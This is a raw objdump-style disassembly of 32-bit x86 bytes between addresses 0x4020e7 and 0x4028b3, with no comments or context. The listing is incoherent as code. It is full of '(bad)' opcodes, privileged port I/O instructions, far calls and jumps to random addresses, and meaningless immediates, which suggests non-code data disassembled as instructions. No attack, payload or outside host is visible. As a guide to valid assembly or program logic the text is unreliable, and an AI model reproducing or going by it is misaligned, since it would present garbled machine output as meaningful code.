  4020e7:	call   0x3366975e
  4020ec:	dec    esi
  4020ed:	and    eax,0xccb6eed3
  4020f2:	mov    ah,0x37
  4020f4:	lahf   
  4020f5:	fidivr DWORD PTR [ebx-0x2e]
  4020f8:	pop    edx
  4020f9:	clc    
  4020fa:	imul   eax,ecx,0xf0995e7f
  402100:	push   es
  402101:	shl    BYTE PTR [edi+0x1f9beb54],0xd9
  402108:	(bad)  
  402109:	push   ebp
  40210a:	out    0x3b,eax
  40210c:	push   edx
  40210d:	inc    ebp
  40210e:	std    
  40210f:	out    0xa5,eax
  402111:	xchg   edi,eax
  402112:	jmp    0x795f31e0
  402117:	fsubrp st(7),st
  402119:	adc    eax,0x18746ec4
  40211e:	pop    edx
  40211f:	test   eax,0xadb88a9f
  402124:	ins    BYTE PTR es:[edi],dx
  402125:	test   eax,0x6b486d36
  40212a:	pop    ecx
  40212b:	adc    bl,BYTE PTR [esi]
  40212d:	pop    eax
  40212e:	test   DWORD PTR [esp+edx*2+0x2f],ebp
  402132:	fdiv   st(7),st
  402134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402135:	jp     0x4021a1
  402137:	clc    
  402138:	sbb    bh,BYTE PTR [edx+ebp*8-0x5c3014d4]
  40213f:	enter  0x7421,0x90
  402143:	xor    eax,0xc9bf9789
  402148:	cmp    al,0xc3
  40214a:	imul   ebp,DWORD PTR [edx],0xbf39ca6d
  402150:	ins    BYTE PTR es:[edi],dx
  402151:	scas   eax,DWORD PTR es:[edi]
  402152:	js     0x40217f
  402154:	sub    ch,BYTE PTR [eax+0x122b41e5]
  40215a:	fsubr  DWORD PTR [ebp+0x3b]
  40215d:	ror    DWORD PTR [ebp+0x7dc4a32f],cl
  402163:	mov    ah,0xea
  402165:	add    esp,DWORD PTR [ebx]
  402167:	ja     0x4021c0
  402169:	ret    
  40216a:	sbb    ecx,DWORD PTR [esi+0x60]
  40216d:	enter  0x439a,0xda
  402171:	lds    ecx,FWORD PTR [edx+0x3e]
  402174:	shl    BYTE PTR [ebx],0x58
  402177:	add    ecx,ebp
  402179:	xchg   edx,eax
  40217a:	(bad)
  40217d:	jae    0x402161
  40217f:	dec    ecx
  402180:	xchg   BYTE PTR [ebx-0x1a],dh
  402183:	nop
  402184:	inc    edi
  402185:	jecxz  0x40219e
  402187:	call   0x4f11fbf2
  40218c:	push   0x32
  40218e:	sub    edi,DWORD PTR [eax-0x1a50e9dd]
  402194:	sub    dh,BYTE PTR [edi+ecx*1-0x7f]
  402198:	sbb    eax,0xc3f9b99d
  40219d:	out    0x47,al
  40219f:	mul    BYTE PTR [edi]
  4021a1:	mov    ecx,0x4c942551
  4021a6:	(bad)
  4021a9:	cli    
  4021aa:	cdq    
  4021ab:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4021ad:	xchg   esp,eax
  4021ae:	inc    eax
  4021af:	or     al,dh
  4021b1:	mov    esp,0x20c18a27
  4021b6:	(bad)  
  4021b7:	or     al,0x2c
  4021b9:	mov    ds:0x316f843c,eax
  4021be:	mov    eax,ds:0x884c3b79
  4021c3:	std    
  4021c4:	dec    esp
  4021c5:	sbb    ebx,edx
  4021c7:	popa   
  4021c8:	inc    eax
  4021c9:	je     0x402160
  4021cb:	ins    DWORD PTR es:[edi],dx
  4021cc:	int3   
  4021cd:	call   0x2704:0xe8b67f4d
  4021d4:	inc    esi
  4021d5:	push   eax
  4021d6:	cmp    edi,DWORD PTR [edi]
  4021d8:	clc    
  4021d9:	adc    eax,0x95d887bd
  4021de:	push   ds
  4021df:	(bad)  
  4021e0:	cmp    eax,0x1b3c978d
  4021e5:	icebp  
  4021e6:	push   0xf5e6641
  4021eb:	addr16 (bad) 
  4021ed:	loop   0x40217c
  4021ef:	or     BYTE PTR [edi+0x6a],dl
  4021f2:	xor    cl,BYTE PTR [esi]
  4021f4:	in     al,dx
  4021f5:	sahf   
  4021f6:	cmc    
  4021f7:	leave  
  4021f8:	popa   
  4021f9:	push   esp
  4021fa:	xchg   edx,eax
  4021fb:	outs   dx,BYTE PTR ds:[esi]
  4021fc:	jo     0x40223c
  4021fe:	data16 jae 0x40226c
  402201:	cmp    esi,edi
  402203:	cmp    esi,DWORD PTR [ecx+0x74abafa0]
  402209:	scas   al,BYTE PTR es:[edi]
  40220a:	jne    0x4021a5
  40220c:	pushf  
  40220d:	xor    BYTE PTR [eax-0x2],dh
  402210:	push   edi
  402211:	cs in  eax,0xa
  402214:	loope  0x40219b
  402216:	out    0x9a,al
  402218:	div    DWORD PTR [edx]
  40221a:	or     eax,0x297b0aca
  40221f:	cmp    dl,al
  402221:	sbb    esp,DWORD PTR [ecx]
  402223:	and    BYTE PTR [edx],bl
  402225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402226:	(bad)  
  402227:	jno    0x4022a3
  402229:	dec    esi
  40222a:	dec    esi
  40222b:	daa    
  40222c:	sbb    DWORD PTR [eax+0x425a548e],ecx
  402232:	jmp    0x4021e5
  402234:	popa   
  402235:	ja     0x402284
  402237:	addr16 enter 0x4f53,0x20
  40223c:	lahf   
  40223d:	mov    ch,0x37
  40223f:	stos   BYTE PTR es:[edi],al
  402240:	xor    esi,esi
  402242:	arpl   WORD PTR [ebp+0x37],bx
  402245:	outs   dx,BYTE PTR ds:[esi]
  402246:	clc    
  402247:	push   ss
  402248:	out    dx,eax
  402249:	add    eax,0xbce8c8a7
  40224e:	sbb    al,0x60
  402250:	xlat   BYTE PTR ds:[ebx]
  402251:	clc    
  402252:	les    ebp,FWORD PTR [ebx]
  402254:	lea    edi,[esi+edi*2+0x72caae55]
  40225b:	mov    esi,0xf0c1e502
  402260:	fdivr  QWORD PTR [ebp+0x26aa57cf]
  402266:	call   0x8c35774d
  40226b:	(bad)  
  40226c:	cmp    BYTE PTR [ecx+0x708ce91b],bl
  402272:	inc    esp
  402273:	adc    BYTE PTR [ebx-0xe],ch
  402276:	sub    bl,BYTE PTR [ebp-0x4]
  402279:	lds    edi,FWORD PTR [edx+0x2f]
  40227c:	pushf  
  40227d:	mov    ch,0x2e
  40227f:	sbb    al,0xe0
  402281:	popf   
  402282:	mov    bh,0x7
  402284:	neg    BYTE PTR [ebx]
  402286:	(bad)  
  402287:	fs push ebp
  402289:	sbb    BYTE PTR [esi],cl
  40228b:	push   cs
  40228c:	jno    0x4022e6
  40228e:	icebp  
  40228f:	jns    0x402253
  402291:	mov    ds:0xd28822d4,eax
  402296:	stc    
  402297:	(bad)  
  402299:	daa    
  40229a:	adc    esi,DWORD PTR [edi-0x512aec70]
  4022a0:	jle    0x4022bb
  4022a2:	push   ss
  4022a3:	lds    ebx,FWORD PTR [eax]
  4022a5:	sub    al,0xc
  4022a7:	or     bl,0x39
  4022aa:	push   ecx
  4022ab:	mov    WORD PTR [ecx+0x1a2d7eb1],cs
  4022b1:	data16 test al,dh
  4022b4:	mov    WORD PTR [ebx+0x8],fs
  4022b7:	xchg   ebp,eax
  4022b8:	jl     0x402247
  4022ba:	in     al,0xcd
  4022bc:	mov    es,esi
  4022be:	mov    ecx,0x5ae16fd7
  4022c3:	int    0xad
  4022c5:	cmp    eax,0x6eb4864e
  4022ca:	movd   DWORD PTR [ecx],mm0
  4022cd:	dec    edi
  4022ce:	aaa    
  4022cf:	fst    QWORD PTR [eax]
  4022d1:	pop    esi
  4022d2:	pop    ecx
  4022d3:	fcomp  DWORD PTR [edi-0x45]
  4022d6:	daa    
  4022d7:	rcl    bh,1
  4022d9:	mov    bl,0x50
  4022db:	out    0x3a,al
  4022dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022de:	adc    DWORD PTR ds:[eax],0x27
  4022e2:	dec    ebx
  4022e3:	inc    ebx
  4022e4:	mov    bl,0x25
  4022e6:	xchg   BYTE PTR [eiz*8+0x75a4bdc9],dl
  4022ed:	push   0x5e074c9c
  4022f2:	aad    0x4b
  4022f4:	ss scas al,BYTE PTR es:[edi]
  4022f6:	pop    edx
  4022f7:	(bad)  
  4022f8:	fist   WORD PTR [edx+0x79]
  4022fb:	fwait
  4022fc:	xchg   esi,eax
  4022fd:	xchg   ecx,eax
  4022fe:	(bad)  
  4022ff:	retf   
  402300:	mov    bl,0x20
  402302:	pop    esp
  402303:	mul    BYTE PTR [esi]
  402305:	mov    cs,WORD PTR [edi+ecx*4]
  402308:	push   0xfffffff2
  40230a:	adc    BYTE PTR [edi],dl
  40230c:	clc    
  40230d:	stos   DWORD PTR es:[edi],eax
  40230e:	add    BYTE PTR [ecx],dl
  402310:	call   0xeeb692fa
  402315:	mov    cl,0xfb
  402317:	jbe    0x40229a
  402319:	dec    edi
  40231a:	xor    eax,0x19bea22d
  40231f:	mov    eax,0xbdc2f7cb
  402324:	push   cs
  402325:	sbb    esi,DWORD PTR [edi+0x3e]
  402328:	mov    dl,dh
  40232a:	aam    0x45
  40232c:	mov    esi,0x32b05399
  402331:	jmp    0x4fef:0xf5ed78c0
  402338:	leave  
  402339:	sahf   
  40233a:	repz xchg esp,eax
  40233c:	stos   BYTE PTR es:[edi],al
  40233d:	jge    0x402388
  40233f:	rcr    BYTE PTR [ebx],cl
  402341:	sub    esi,esp
  402343:	je     0x40236d
  402345:	inc    esi
  402346:	dec    esi
  402347:	aam    0x44
  402349:	xor    DWORD PTR [eax+ebp*1],esi
  40234c:	out    0xd3,eax
  40234e:	out    dx,eax
  40234f:	(bad)
  402352:	repnz pop edx
  402354:	int3   
  402355:	leave  
  402356:	jmp    0x222c020c
  40235b:	popf   
  40235c:	ins    DWORD PTR es:[edi],dx
  40235d:	inc    esp
  40235e:	jecxz  0x402318
  402360:	repz adc BYTE PTR ds:[bx+si],0xe9
  402366:	mov    ebx,0xbc2e889e
  40236b:	icebp  
  40236c:	xor    DWORD PTR ds:0xd5bbfef1,ebp
  402372:	addr16 jns 0x4023b0
  402375:	stos   DWORD PTR es:[edi],eax
  402376:	mov    bl,0xed
  402378:	(bad)  
  402379:	in     eax,dx
  40237a:	mov    esp,0x5c0cbfac
  40237f:	sub    eax,0x94888c9e
  402384:	icebp  
  402385:	call   0xc40ae3cb
  40238a:	(bad)  
  40238b:	or     ebx,edx
  40238d:	adc    al,0xb8
  40238f:	hlt    
  402390:	popa   
  402391:	neg    eax
  402393:	dec    ecx
  402394:	iret   
  402395:	(bad)  
  402396:	in     al,dx
  402397:	xchg   edx,eax
  402398:	adc    ebx,ebx
  40239a:	loopne 0x40232f
  40239c:	mov    bl,0xf7
  40239e:	hlt    
  40239f:	sbb    eax,0x43a81424
  4023a4:	adc    ebp,eax
  4023a6:	adc    bh,BYTE PTR [eax+0xf13f3cc]
  4023ac:	cmp    bh,al
  4023ae:	fwait
  4023af:	cld    
  4023b0:	xchg   ebp,eax
  4023b1:	jmp    0x3e80c866
  4023b6:	add    al,0x47
  4023b8:	sar    DWORD PTR [eax-0x3e],cl
  4023bb:	jae    0x4023c5
  4023bd:	ror    BYTE PTR fs:[esi],cl
  4023c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023c1:	mov    BYTE PTR ds:0x5482ea3,dl
  4023c7:	pop    ds
  4023c8:	icebp  
  4023c9:	adc    esp,esp
  4023cb:	call   0x3f4fa76b
  4023d0:	jg     0x402357
  4023d2:	sbb    DWORD PTR ds:[ebx],ebx
  4023d5:	loopne 0x4023a0
  4023d7:	mov    ds:0x503b3959,al
  4023dc:	mov    al,ds:0xaae6ea78
  4023e1:	or     bl,bl
  4023e3:	lock xlat BYTE PTR ds:[bx]
  4023e6:	test   BYTE PTR ds:0xe9e55552,dl
  4023ec:	sbb    ebp,ebx
  4023ee:	popa   
  4023ef:	or     al,0x19
  4023f1:	dec    esp
  4023f2:	bound  esi,QWORD PTR [ebp-0x2bc9f93f]
  4023f8:	rcl    BYTE PTR [ecx+0x2d],1
  4023fb:	xchg   edx,eax
  4023fc:	fidiv  DWORD PTR [esi]
  4023fe:	neg    bl
  402400:	xchg   ecx,eax
  402401:	div    DWORD PTR [ebx]
  402403:	lds    edi,FWORD PTR [edi]
  402405:	and    BYTE PTR [ebx-0x1a6b1d36],bl
  40240b:	mov    dl,0xcd
  40240d:	inc    esi
  40240e:	jecxz  0x40239e
  402410:	inc    esi
  402412:	add    BYTE PTR ds:[ebp+0x7651e40a],ch
  402419:	adc    eax,0x672d1236
  40241e:	xchg   edi,eax
  40241f:	fisttp WORD PTR [ebp+0x6c780d67]
  402425:	int    0x8d
  402427:	fisubr WORD PTR [esi+0x1d]
  40242a:	dec    ebp
  40242b:	dec    ebp
  40242c:	mov    edi,0x23e393aa
  402431:	mov    ebx,0x9ef826d9
  402436:	push   ecx
  402437:	sub    DWORD PTR [ebx-0x2603aabc],ecx
  40243d:	inc    edi
  40243e:	jge    0x402484
  402440:	mov    ebp,0xede6b13a
  402445:	and    ebp,esi
  402447:	sub    BYTE PTR [eax],al
  402449:	mov    ah,0x5
  40244b:	dec    edi
  40244c:	or     BYTE PTR ds:0xbfd3cde,ch
  402452:	popa   
  402453:	push   0x53
  402455:	retf   0xf454
  402458:	mov    eax,0xe284b7bd
  40245d:	pop    ds
  40245e:	addr16 cmc 
  402460:	pop    es
  402461:	xchg   ebx,eax
  402462:	dec    edx
  402463:	inc    ecx
  402464:	inc    ecx
  402465:	dec    ecx
  402466:	setbe  ah
  402469:	popa   
  40246a:	in     eax,0xcc
  40246c:	pop    ebp
  40246d:	loope  0x4024b8
  40246f:	or     DWORD PTR [edx+0x46bbab96],ecx
  402475:	int    0x9f
  402477:	xchg   BYTE PTR [eax],bh
  402479:	(bad)  
  40247a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40247b:	or     DWORD PTR [esi+0x6a38be41],ecx
  402481:	push   cs
  402482:	out    0xe4,al
  402484:	not    DWORD PTR [di-0x6e]
  402488:	xor    eax,0x6d144412
  40248d:	adc    al,0xd4
  40248f:	std    
  402490:	pop    edi
  402491:	test   al,0xf
  402493:	das    
  402494:	add    bh,BYTE PTR [edi*2-0x8db864d]
  40249b:	inc    ecx
  40249c:	xchg   ecx,eax
  40249d:	add    eax,0xa593638
  4024a2:	sar    BYTE PTR fs:[eax],1
  4024a5:	fcom   DWORD PTR [ecx-0x7a8b14e]
  4024ab:	cmp    dh,BYTE PTR [ecx]
  4024ad:	leave  
  4024ae:	inc    ebp
  4024af:	mov    BYTE PTR [eax+0x13],0x2e
  4024b3:	in     eax,0xae
  4024b5:	mov    ecx,0xcea07323
  4024ba:	cmp    bl,bl
  4024bc:	cmp    DWORD PTR [esi+esi*2-0x7b147166],edx
  4024c3:	mov    eax,ds:0xe203fbaf
  4024c8:	leave  
  4024c9:	jl     0x40253d
  4024cb:	sbb    BYTE PTR [eax],al
  4024cd:	jno    0x402495
  4024cf:	cmp    DWORD PTR [ecx+0x75],0x5321b391
  4024d6:	dec    edx
  4024d7:	dec    ebp
  4024d8:	pop    es
  4024d9:	dec    esp
  4024da:	push   esp
  4024db:	inc    edx
  4024dc:	mov    eax,DWORD PTR [ebx-0x18985046]
  4024e2:	sub    BYTE PTR [ecx+0x72],cl
  4024e5:	adc    esi,DWORD PTR [ebx+0x2a]
  4024e8:	push   ebx
  4024e9:	repz jmp 0x402473
  4024ec:	mov    ebx,0x32875561
  4024f1:	lods   eax,DWORD PTR ds:[esi]
  4024f2:	das    
  4024f3:	adc    eax,0x19b62d5e
  4024f8:	sub    DWORD PTR [ebx],ecx
  4024fa:	or     BYTE PTR [eax],cl
  4024fc:	out    dx,al
  4024fd:	pop    edi
  4024fe:	stos   BYTE PTR es:[edi],al
  4024ff:	lods   al,BYTE PTR ds:[esi]
  402500:	xor    BYTE PTR [edi+0x33],al
  402503:	je     0x402487
  402505:	retf   
  402506:	(bad)  
  402507:	fisttp DWORD PTR [ebx-0x7b6d0b95]
  40250d:	add    bh,BYTE PTR [edx+edx*8+0x1b]
  402511:	popa   
  402512:	fdiv   QWORD PTR [eax+eax*8+0x2b59e893]
  402519:	pop    ds
  40251a:	cld    
  40251b:	mov    al,ds:0x834b520b
  402520:	in     al,0x3d
  402522:	icebp  
  402523:	xor    DWORD PTR [esi+0x317a0da4],edi
  402529:	xor    DWORD PTR [ebx-0x4ee1dd09],eax
  40252f:	pushf  
  402530:	fstp   TBYTE PTR [eax+0x55499c00]
  402536:	je     0x4024c1
  402538:	push   esi
  402539:	sti    
  40253a:	pop    edx
  40253b:	cmp    al,0x2a
  40253d:	add    ah,BYTE PTR [ecx]
  40253f:	add    BYTE PTR [eax+0x51],dh
  402542:	pop    edi
  402543:	cs xchg edi,eax
  402545:	aam    0x4b
  402547:	daa    
  402548:	in     eax,dx
  402549:	add    dl,BYTE PTR [eax]
  40254b:	lods   al,BYTE PTR ds:[esi]
  40254c:	and    edi,DWORD PTR [esi+0x43f4f59d]
  402552:	mov    eax,ds:0xab935043
  402557:	mov    dh,0x2b
  402559:	pop    eax
  40255a:	test   bh,ch
  40255c:	sbb    al,0xc1
  40255e:	xor    DWORD PTR gs:[ebx],ebp
  402561:	and    edi,DWORD PTR [eax]
  402563:	icebp  
  402564:	std    
  402565:	gs inc ebp
  402567:	jecxz  0x4025a3
  402569:	lods   eax,DWORD PTR ds:[esi]
  40256a:	push   cs
  40256b:	or     dl,BYTE PTR [ebp-0x37]
  40256e:	push   0xffffff9c
  402570:	int    0x5f
  402572:	jo     0x4025d1
  402574:	sbb    BYTE PTR [edx+ebx*2-0x2e33c5c1],al
  40257b:	dec    esi
  40257c:	pop    es
  40257d:	stc    
  40257e:	(bad)  
  40257f:	repnz push edi
  402581:	lds    esi,FWORD PTR [esi]
  402583:	inc    ecx
  402584:	or     al,0x73
  402586:	and    al,0xfc
  402588:	repnz pusha 
  40258a:	and    ch,dl
  40258c:	retf   0x433e
  40258f:	pop    ebx
  402590:	inc    ebp
  402591:	pop    edi
  402592:	outs   dx,DWORD PTR ds:[esi]
  402593:	leave  
  402594:	add    ebx,0xffffffca
  402597:	ja     0x4025be
  402599:	cmp    edi,esi
  40259b:	jge    0x40254e
  40259d:	xchg   edi,eax
  40259e:	jnp    0x402589
  4025a0:	je     0x40256d
  4025a2:	ins    BYTE PTR es:[edi],dx
  4025a3:	call   0xd7db2a9d
  4025a8:	or     DWORD PTR [edi+0x7],edi
  4025ab:	in     eax,dx
  4025ac:	adc    eax,esi
  4025ae:	cmp    DWORD PTR [ebx-0x7a2a32dd],esi
  4025b4:	xor    eax,esi
  4025b6:	repz addr16 adc edi,edx
  4025ba:	sub    al,0x99
  4025bc:	fsubp  st(4),st
  4025be:	aad    0xcb
  4025c0:	bound  ebp,QWORD PTR [ecx+0x4b88c205]
  4025c6:	jno    0x402585
  4025c8:	sbb    DWORD PTR [ebp-0x45],esp
  4025cb:	pop    es
  4025cc:	jb     0x402648
  4025ce:	popf   
  4025cf:	repz sahf 
  4025d1:	retf   0x933b
  4025d4:	mov    edi,DWORD PTR [esi-0xd]
  4025d7:	inc    edx
  4025d8:	pop    ds
  4025d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025da:	push   esp
  4025db:	icebp  
  4025dc:	push   ds
  4025dd:	pushf  
  4025de:	and    DWORD PTR ds:0xbf4226,0xffffffe4
  4025e5:	int3   
  4025e6:	xor    DWORD PTR [esp+edx*4-0x3136ebb5],0xffffff98
  4025ee:	ins    BYTE PTR es:[edi],dx
  4025ef:	jmp    0x402575
  4025f1:	add    eax,0x8e160bd3
  4025f6:	dec    esi
  4025f7:	pop    esp
  4025f8:	pop    ebp
  4025f9:	scas   al,BYTE PTR es:[edi]
  4025fa:	cmp    DWORD PTR ds:0x34143e43,esi
  402600:	imul   ebp,esi,0xbbe50b4
  402606:	dec    eax
  402607:	lods   eax,DWORD PTR ds:[esi]
  402608:	inc    eax
  402609:	pop    es
  40260a:	inc    edx
  40260b:	jl     0x4025f1
  40260d:	inc    eax
  40260e:	ins    BYTE PTR es:[edi],dx
  40260f:	dec    esi
  402610:	(bad)  
  402611:	(bad)  
  402612:	hlt    
  402613:	push   ecx
  402614:	mov    al,ds:0xda80d24e
  402619:	dec    esi
  40261a:	mov    ds:0xc80ace2e,al
  40261f:	icebp  
  402620:	lahf   
  402621:	cmc    
  402622:	xchg   ebp,eax
  402623:	jmp    0x402624
  402625:	outs   dx,BYTE PTR ds:[esi]
  402626:	pop    es
  402627:	leave  
  402628:	adc    esi,DWORD PTR gs:[bx+di]
  40262c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40262d:	ror    DWORD PTR [ebx+0x5c],cl
  402630:	mov    eax,ds:0xe3864d3b
  402635:	pusha  
  402636:	aas    
  402637:	add    DWORD PTR [ebp-0x747ddf13],ebx
  40263d:	test   eax,0x965240dd
  402642:	pop    ss
  402643:	sbb    eax,0xaa567da4
  402648:	jae    0x4025d7
  40264a:	ret    
  40264b:	dec    edi
  40264c:	xor    eax,0x1188cc03
  402651:	jmp    0x402629
  402653:	push   esi
  402654:	add    al,0xd2
  402656:	xor    eax,0x75a802f8
  40265b:	push   ebp
  40265c:	cmp    ecx,ebx
  40265e:	loop   0x402644
  402660:	push   ebx
  402661:	cmc    
  402662:	test   DWORD PTR [eax],esp
  402664:	jg     0x40268f
  402666:	inc    esp
  402667:	stos   DWORD PTR es:[edi],eax
  402668:	(bad)  
  40266a:	jne    0x40261e
  40266c:	scas   eax,DWORD PTR es:[edi]
  40266d:	push   es
  40266e:	lock fsub DWORD PTR [ecx+0x1862cb0]
  402675:	lea    edx,[ebx-0xe7326df]
  40267b:	stos   BYTE PTR es:[edi],al
  40267c:	rcl    DWORD PTR [ebx],cl
  40267e:	mov    edx,0xcaeb2cb7
  402683:	and    BYTE PTR [edx],0x8b
  402686:	jg     0x4026fa
  402688:	xor    eax,0x8056b09
  40268d:	sar    DWORD PTR [ecx-0x4979f78f],cl
  402693:	lods   eax,DWORD PTR ds:[esi]
  402694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402695:	or     ebx,esp
  402697:	loop   0x4026e8
  402699:	inc    ebp
  40269a:	push   es
  40269b:	adc    ecx,DWORD PTR [esi-0x7865dc80]
  4026a1:	gs pushf 
  4026a3:	pop    edx
  4026a4:	int    0xcb
  4026a6:	ret    0xf841
  4026a9:	xchg   esi,eax
  4026aa:	inc    edx
  4026ab:	jno    0x402633
  4026ad:	les    ecx,FWORD PTR [eax-0x65]
  4026b0:	test   al,0x1b
  4026b2:	push   edx
  4026b3:	or     esi,DWORD PTR [eax-0x71c74180]
  4026b9:	and    DWORD PTR [ecx-0x1a],edx
  4026bc:	inc    ebx
  4026bd:	aad    0x55
  4026bf:	add    al,0xe6
  4026c1:	daa    
  4026c2:	pop    es
  4026c3:	(bad)  
  4026c4:	gs aam 0xa6
  4026c7:	xor    BYTE PTR [edx+0x1],al
  4026ca:	sub    edx,DWORD PTR [edi+edx*4]
  4026cd:	mov    bh,0x5d
  4026cf:	ins    BYTE PTR es:[edi],dx
  4026d0:	dec    ebx
  4026d1:	leave  
  4026d2:	cmp    dh,BYTE PTR [ecx+0x5d288a1f]
  4026d8:	mov    ch,dl
  4026da:	ins    BYTE PTR es:[edi],dx
  4026db:	jmp    0x40274b
  4026dd:	or     DWORD PTR [edi-0x65],0x8d363c0b
  4026e4:	test   eax,0xb21af925
  4026e9:	add    ch,BYTE PTR [esi]
  4026eb:	into   
  4026ec:	rcl    BYTE PTR [ecx-0x16],cl
  4026ef:	addr16 xchg edi,eax
  4026f1:	int3   
  4026f2:	pop    es
  4026f3:	data16 stos BYTE PTR es:[edi],al
  4026f5:	repnz add edx,DWORD PTR [eax+0x48]
  4026f9:	mov    al,ds:0xc3039f28
  4026fe:	pop    esi
  4026ff:	sbb    eax,0xa7bef562
  402704:	les    edi,FWORD PTR [eax]
  402706:	test   BYTE PTR [ecx+0x12],ch
  402709:	xchg   edx,eax
  40270a:	hlt    
  40270b:	out    0x84,al
  40270d:	jp     0x40274b
  40270f:	cmp    edi,DWORD PTR [eax]
  402711:	fld    TBYTE PTR [ebp-0x243b1af3]
  402717:	xor    ecx,DWORD PTR [esi]
  402719:	inc    ebx
  40271a:	xchg   edx,eax
  40271b:	fiadd  DWORD PTR [ebp+0x303088af]
  402721:	cli    
  402722:	les    edi,FWORD PTR [edx-0x1b]
  402725:	mov    eax,0x59ab1617
  40272a:	out    0x6c,al
  40272c:	pop    edx
  40272d:	fsub   QWORD PTR [ebp+0x59]
  402730:	addr16 shl cl,0xf4
  402734:	xchg   BYTE PTR [ecx+0x28bbdd7c],dl
  40273a:	sbb    eax,0x9b8d2df3
  40273f:	pop    DWORD PTR [edi+0x3bf8a37d]
  402745:	dec    ecx
  402746:	xlat   BYTE PTR ss:[ebx]
  402748:	iret   
  402749:	pop    edi
  40274a:	push   cs
  40274b:	test   esp,eax
  40274d:	fistp  DWORD PTR [edi+0x21]
  402750:	cmp    DWORD PTR [esi-0x5f],0x9
  402754:	jp     0x4026f5
  402756:	and    DWORD PTR [eax+0x4fbed357],eax
  40275c:	and    BYTE PTR [eax-0x43],0xab
  402760:	ja     0x4026fc
  402762:	and    ch,BYTE PTR [ebp+0x1a]
  402765:	ja     0x4027ca
  402767:	xchg   eax,edi
  402769:	in     eax,0x59
  40276b:	mov    bl,0x30
  40276d:	push   0x8448cd01
  402772:	adc    eax,0x75aabd49
  402777:	pushf  
  402778:	xor    BYTE PTR [ebx+0x7443d7f2],al
  40277e:	mov    al,ds:0xa3bbc430
  402783:	xchg   edi,eax
  402784:	int    0xa2
  402786:	pop    ebx
  402787:	jno    0x402713
  402789:	jecxz  0x40279a
  40278b:	pop    edx
  40278c:	or     ch,dh
  40278e:	xchg   esp,eax
  40278f:	stc    
  402790:	rcr    BYTE PTR [edi-0x7d],cl
  402793:	add    DWORD PTR [di+0x3fc7],ebp
  402798:	loop   0x402806
  40279a:	leave  
  40279b:	jmp    0x329331a6
  4027a0:	push   ebx
  4027a1:	pop    esi
  4027a2:	shr    DWORD PTR [ebx],0x7a
  4027a5:	push   0xfffffffb
  4027a7:	push   ds
  4027a8:	push   eax
  4027a9:	call   0xdaab:0xc9413b48
  4027b0:	sbb    esi,ebp
  4027b2:	xchg   ebx,eax
  4027b3:	rcr    DWORD PTR [edi],cl
  4027b5:	sub    DWORD PTR [edx-0x4c],0x3e
  4027b9:	stos   DWORD PTR es:[edi],eax
  4027ba:	cmp    ch,ch
  4027bc:	jg     0x4027ee
  4027be:	sbb    al,0xe3
  4027c0:	pusha  
  4027c1:	sbb    al,0xd5
  4027c3:	jl     0x4027c8
  4027c5:	lea    esi,[ebp-0x66]
  4027c8:	sub    eax,0x15a2bd2b
  4027cd:	jo     0x4027b0
  4027cf:	inc    esp
  4027d0:	pushf  
  4027d1:	sbb    BYTE PTR [edx+0x543a4502],bh
  4027d7:	inc    eax
  4027d8:	retf   
  4027d9:	push   eax
  4027da:	iret   
  4027db:	ds ret 
  4027dd:	pop    esi
  4027de:	loopne 0x402789
  4027e0:	jmp    0x402786
  4027e2:	push   0x9f1bc01a
  4027e7:	or     al,0x7
  4027e9:	rol    BYTE PTR [edi],1
  4027eb:	data16 fstp QWORD PTR gs:0x56dc9655
  4027f3:	sub    bl,BYTE PTR [ebx]
  4027f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f6:	ret    0x7f03
  4027f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027fb:	cli    
  4027fc:	sbb    bl,al
  4027fe:	sub    BYTE PTR [esi+edx*4+0xe6f897e],0x2c
  402806:	lock rcl dl,0x66
  40280a:	xor    ebp,ebx
  40280c:	sbb    BYTE PTR [esi+0x4b784013],bl
  402812:	ffree  st(6)
  402814:	cli    
  402815:	cs jo  0x40287f
  402818:	or     eax,0x97f0027b
  40281d:	inc    ecx
  40281e:	js     0x40283c
  402820:	cmc    
  402821:	icebp  
  402822:	hlt    
  402823:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  402825:	push   0xffffffbc
  402827:	mov    ds:0x81e5cadb,al
  40282c:	xchg   DWORD PTR [eax+ecx*2],ecx
  40282f:	imul   ebp,DWORD PTR [esi-0x282fd768],0x84d3fec0
  402839:	ss push esi
  40283b:	rcl    BYTE PTR [eax-0x78637959],0xc1
  402842:	cmp    eax,0x8ea96474
  402847:	std    
  402848:	pop    es
  402849:	pop    ecx
  40284a:	jne    0x4027d3
  40284c:	mov    eax,0x6199a1ae
  402851:	mov    edi,0xc6d12a3c
  402856:	(bad)  
  402857:	clc    
  402858:	int3   
  402859:	inc    ecx
  40285a:	jp     0x402826
  40285c:	cmp    BYTE PTR [esp+edi*2+0x75ecd54e],al
  402863:	cmp    ebx,DWORD PTR [ebp-0x62]
  402866:	sub    eax,0x5a535c4a
  40286b:	pop    ebx
  40286c:	jp     0x4028e7
  40286e:	dec    ebx
  40286f:	repnz repz and BYTE PTR ds:[edx-0x1e],bl
  402875:	mov    eax,ds:0x480c696d
  40287a:	mov    BYTE PTR [ecx-0x70],dl
  40287d:	xchg   ah,cl
  40287f:	into   
  402880:	rcl    BYTE PTR [edi+0x6f],0xae
  402884:	mov    eax,ds:0x83afd14f
  402889:	xchg   edx,eax
  40288a:	xchg   ebx,eax
  40288b:	cmp    edi,DWORD PTR [edi-0x2b]
  40288e:	mov    al,BYTE PTR [ebp+ebx*4+0xf9d034]
  402895:	cld    
  402896:	mov    edi,esp
  402898:	cmp    eax,0xeaffd326
  40289d:	mov    eax,0xe1a02eb8
  4028a2:	fwait
  4028a3:	mov    ch,0xe4
  4028a5:	and    al,0x14
  4028a7:	addr16 fs loope 0x4028e4
  4028ab:	test   DWORD PTR [edx+0x1df467a2],ecx
  4028b1:	or     BYTE PTR [ebx],ch
  4028b3:	(bad)  [ecx]
